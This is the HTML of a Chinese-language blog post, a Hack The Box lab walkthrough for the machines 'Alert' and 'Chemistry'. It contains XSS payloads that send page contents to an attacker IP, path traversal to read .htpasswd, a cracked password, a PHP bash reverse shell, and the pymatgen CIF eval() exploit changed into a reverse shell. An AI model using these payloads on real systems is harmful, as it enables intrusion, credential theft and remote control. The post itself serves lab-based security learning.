@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="开放端口：22、80，httpserver 是 Apache 进入 80 端口的网页，发现存在 Markdown 文件上传 根据Alert，猜测是xss  子域名爆破ffuf -w &#x2F;root&#x2F;fuzzDicts&#x2F;subdomainDicts&#x2F;main.txt -u http:&#x2F;&#x2F;alert.htb -H “Host:FUZZ.alert.htb” -a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="htb-Alert">
+<meta property="og:url" content="https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="开放端口：22、80，httpserver 是 Apache 进入 80 端口的网页，发现存在 Markdown 文件上传 根据Alert，猜测是xss  子域名爆破ffuf -w &#x2F;root&#x2F;fuzzDicts&#x2F;subdomainDicts&#x2F;main.txt -u http:&#x2F;&#x2F;alert.htb -H “Host:FUZZ.alert.htb” -a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157852400-389493bf-f21e-4539-adfb-7a9fceb78f2d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734079889364-48ed658e-a906-4215-96cf-83686963ea1d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734080736755-59392a62-694e-47a7-9f8b-2eb75a462b69.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143694804-5e15ed60-1ada-407a-a60a-f629c25944cd.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143736344-0fbf6602-74c1-4c35-abaf-cc5375e5c450.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143769013-138d1cc5-e1b5-4374-82ba-9a3970fdd6dc.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143943390-ea143ce1-8ae0-4fab-8c7b-8a038e2f9cb7.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142899045-031df263-6648-47c1-bc72-570110d215ea.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141313880-0743371f-a2cf-4836-839e-4f3bfbff65fa.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141476707-f41a9979-1bd7-48fb-b38a-ed5299e903b1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141628448-47b55910-f62c-40dc-9f7a-c403a39e48f3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141706952-00ddc997-a807-4dbd-a782-f60be3d77fc1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142794331-1f8c3933-7475-4d19-9ec7-e93f4556c513.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734158410936-284ccf4d-4dca-4a7d-8a82-fc2b2dba0ece.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157886992-2eb4c7e2-a246-4f73-818c-e1f70bff065d.png">
+<meta property="article:published_time" content="2024-10-03T02:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-04T12:50:25.110Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157852400-389493bf-f21e-4539-adfb-7a9fceb78f2d.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>htb-Alert</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&text=htb-Alert"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&is_video=false&description=htb-Alert"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=htb-Alert&body=Check out this article: https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&name=htb-Alert&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&t=htb-Alert"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">子域名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">xss漏洞触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash"><span class="toc-number">3.</span> <span class="toc-text">爆破hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chemistry"><span class="toc-number"></span> <span class="toc-text">Chemistry</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">漏洞利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E6%8B%AC"><span class="toc-number">2.</span> <span class="toc-text">概括</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">3.</span> <span class="toc-text">细节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">易受攻击的代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E8%AF%81%E6%98%8E"><span class="toc-number">4.</span> <span class="toc-text">概念证明</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        htb-Alert
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-03T02:51:29.000Z" class="dt-published" itemprop="datePublished">2024-10-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157852400-389493bf-f21e-4539-adfb-7a9fceb78f2d.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734079889364-48ed658e-a906-4215-96cf-83686963ea1d.png"></p>
+<p>开放端口：22、80，httpserver 是 Apache</p>
+<p>进入 80 端口的网页，发现存在 Markdown 文件上传</p>
+<p>根据Alert，猜测是xss</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734080736755-59392a62-694e-47a7-9f8b-2eb75a462b69.png"></p>
+<h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><p>ffuf -w &#x2F;root&#x2F;fuzzDicts&#x2F;subdomainDicts&#x2F;main.txt -u <a target="_blank" rel="noopener" href="http://alert.htb/">http://alert.htb</a> -H “Host:FUZZ.alert.htb” -ac</p>
+<p><code>**-ac**</code></p>
+<ul>
+<li>自动过滤响应，排除那些响应大小与其他多数响应相似的请求。</li>
+<li>这个功能有助于减少无关的输出，让模糊测试的结果更聚焦。</li>
+</ul>
+<h3 id="xss漏洞触发点"><a href="#xss漏洞触发点" class="headerlink" title="xss漏洞触发点"></a>xss漏洞触发点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先上传这个脚本，起python8888端口监听，发送过去之后解码</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143694804-5e15ed60-1ada-407a-a60a-f629c25944cd.png"></p>
+<p>再发送contact us附上刚才md文件链接</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143736344-0fbf6602-74c1-4c35-abaf-cc5375e5c450.png"></p>
+<p>这边猜测后台有管理员机器人自动点击链接</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143769013-138d1cc5-e1b5-4374-82ba-9a3970fdd6dc.png"></p>
+<p>发现管理员多个messages界面</p>
+<p>再发一次，同步上述流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143943390-ea143ce1-8ae0-4fab-8c7b-8a038e2f9cb7.png"></p>
+<p>可以开始构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php?file=filepath&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过尝试，无法直接读取到 &#x2F;etc&#x2F;passwd 这种敏感文件</p>
+<p>但是考虑到 web 服务器使用的是 Apache，可以参考一下这篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cunjiu9486/article/details/109071899">https://blog.csdn.net/cunjiu9486/article/details/109071899</a></p>
+<p>于是有效载荷就修改为了这样↓</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.16.11:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142899045-031df263-6648-47c1-bc72-570110d215ea.png"></p>
+<p>%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A</p>
+<p>url解码</p>
+<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+
+</pre>
+
+<p>只保留pre中间的内容到.hash后缀文件中</p>
+<h3 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a>爆破hash</h3><p>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt –format&#x3D;md5crypt-long alert.hash</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141313880-0743371f-a2cf-4836-839e-4f3bfbff65fa.png"></p>
+<p>albert:manchesterunited</p>
+<p>ssh <a href="mailto:&#x61;&#x6c;&#98;&#x65;&#114;&#x74;&#64;&#49;&#x30;&#46;&#49;&#x30;&#46;&#x31;&#49;&#46;&#x34;&#x34;">&#x61;&#x6c;&#98;&#x65;&#114;&#x74;&#64;&#49;&#x30;&#46;&#49;&#x30;&#46;&#x31;&#49;&#46;&#x34;&#x34;</a></p>
+<p>pa -aux看端口，发现8080开着php或者上传linpeas</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141476707-f41a9979-1bd7-48fb-b38a-ed5299e903b1.png"></p>
+<p>看下进程</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141628448-47b55910-f62c-40dc-9f7a-c403a39e48f3.png"></p>
+<p>看到config这个文件属于root，可以直接修改php内容反弹shell。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141706952-00ddc997-a807-4dbd-a782-f60be3d77fc1.png"></p>
+<p>监听</p>
+<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.16.11/9999 0>&1'"); ?>
+
+<p>如果没反应再curl一下127.0.0.1:8080</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142794331-1f8c3933-7475-4d19-9ec7-e93f4556c513.png"></p>
+<h2 id="Chemistry"><a href="#Chemistry" class="headerlink" title="Chemistry"></a>Chemistry</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734158410936-284ccf4d-4dca-4a7d-8a82-fc2b2dba0ece.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157886992-2eb4c7e2-a246-4f73-818c-e1f70bff065d.png"></p>
+<p>nmap扫描</p>
+<p>扫到5000端口</p>
+<h3 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h3><p><a target="_blank" rel="noopener" href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></p>
+<h3 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h3><p><code>JonesFaithfulTransformation.from_transformation_str()</code>库中的方法存在一个严重的安全漏洞<code>pymatgen</code>。此方法不安全地利用 eval() 来处理输入，在解析不受信任的输入时允许执行任意代码。解析恶意创建的 CIF 文件时可以利用此漏洞。</p>
+<h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>漏洞原因在<a target="_blank" rel="noopener" href="https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108">pymatgen&#x2F;symmetry&#x2F;settings.py#L97C1-L111C108</a>中，存在缺陷的代码段涉及正则表达式操作，然后使用<code>eval()</code>。</p>
+<h4 id="易受攻击的代码"><a href="#易受攻击的代码" class="headerlink" title="易受攻击的代码"></a>易受攻击的代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">basis_change = [</span><br><span class="line">    re.sub(r&quot;(?&lt;=\w|\))(?=\() | (?&lt;=\))(?=\w) | (?&lt;=(\d|a|b|c))(?=([abc]))&quot;, r&quot;*&quot;, string, flags=re.X)</span><br><span class="line">    for string in basis_change</span><br><span class="line">]</span><br><span class="line">&quot;&quot;&quot;snip&quot;&quot;&quot;</span><br><span class="line">([eval(x, &#123;&quot;__builtins__&quot;: None&#125;, &#123;&quot;a&quot;: a, &quot;b&quot;: b, &quot;c&quot;: c&#125;) for x in basis_change])</span><br></pre></td></tr></table></figure>
+
+<p><code>__builtins__</code>即使将 eval设置为，使用 eval<code>None</code>仍存在安全风险。<code>BuiltinImporter</code>可以使用子类遍历来恢复该类。  </p>
+<h3 id="概念证明"><a href="#概念证明" class="headerlink" title="概念证明"></a>概念证明</h3><p>该漏洞可利用如下方式：</p>
+<p><code>vuln.cif</code>创建一个包含以下内容的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data_5yOhtAoR</span><br><span class="line">_audit_creation_date            2018-06-08</span><br><span class="line">_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line">k1 [0 0 0]</span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;touch pwned&quot;);0,0,0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS  62.448</span><br><span class="line">_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后，使用以下代码解析cif文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pymatgen.io.cif import CifParser</span><br><span class="line">parser = CifParser(&quot;vuln.cif&quot;)</span><br><span class="line">structure = parser.parse_structures()</span><br></pre></td></tr></table></figure>
+
+<p>利用poc，修改概念证明中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data_5yOhtAoR</span><br><span class="line">_audit_creation_date            2018-06-08</span><br><span class="line">_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line">k1 [0 0 0]</span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.11/4343 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS  62.448</span><br><span class="line">_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></pre></td></tr></table></figure>
+
+<p>传上去解析有问题</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
